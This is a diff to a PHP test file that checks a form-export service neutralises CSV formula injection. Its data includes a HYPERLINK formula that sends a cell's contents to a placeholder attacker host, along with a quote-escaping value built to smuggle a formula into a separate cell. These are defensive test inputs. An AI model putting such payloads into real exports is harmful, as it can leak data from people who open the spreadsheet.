@@ -262,14 +262,19 @@ describe( 'CSV formula neutralisation (issue #150)', function (): void {
     it( 'prefixes a cell starting with a formula character', function ( string $cell ): void {
         expect( $this->service->neutraliseFormula( $cell ) )->toBe( "'" . $cell );
     } )->with( [
-        'equals'          => '=HYPERLINK("http://evil.example/?"&A1,"Click")',
-        'plus'            => '+SUM(A1:A2)',
-        'minus'           => '-2+3',
-        'at'              => '@SUM(A1)',
-        'tab'             => "\t=1+1",
-        'carriage return' => "\r=1+1",
-        'minus then text' => '-cmd',
-        'number, newline' => "-5\n",
+        'equals'           => '=HYPERLINK("http://evil.example/?"&A1,"Click")',
+        'plus'             => '+SUM(A1:A2)',
+        'minus'            => '-2+3',
+        'at'               => '@SUM(A1)',
+        'tab'              => "\t=1+1",
+        'carriage return'  => "\r=1+1",
+        'minus then text'  => '-cmd',
+        'number, newline'  => "-5\n",
+        'line feed'        => "\n=1+1",
+        'full-width ＝'    => '＝1+1',
+        'full-width ＋'    => '＋SUM(A1:A2)',
+        'full-width －'    => '－2+3',
+        'full-width ＠'    => '＠SUM(A1)',
     ] );
 
     it( 'leaves ordinary values, plain numbers and E.164 phone numbers alone', function ( mixed $cell ): void {
@@ -353,5 +358,27 @@ describe( 'CSV formula neutralisation (issue #150)', function (): void {
 
         expect( $csv )->toContain( "'+SUM(A1:A2)" )
             ->not->toMatch( '/(^|,)"?\+SUM/m' );
+    } );
+
+    it( 'doubles a quote after a backslash, so a value cannot break out into a formula cell', function (): void {
+        $form       = Form::factory()->create();
+        $field      = FormField::factory()->for( $form )->create( ['name' => 'comment', 'label' => 'Comment', 'type' => 'text'] );
+        $submission = FormSubmission::factory()->for( $form )->create();
+        FormSubmissionValue::factory()->for( $submission, 'submission' )->create( [
+            'field_id'   => $field->id,
+            'field_name' => 'comment',
+            'value'      => 'hello\\",=1+1,',
+        ] );
+
+        $response = $this->service->exportToCsv( $form, $form->submissions()->get() );
+
+        ob_start();
+        $response->sendContent();
+        $lines = explode( "\n", trim( ob_get_clean() ) );
+
+        $cells = str_getcsv( $lines[1], escape: '' );
+
+        expect( $cells )->toContain( 'hello\\",=1+1,' )
+            ->not->toContain( '=1+1' );
     } );
 } );
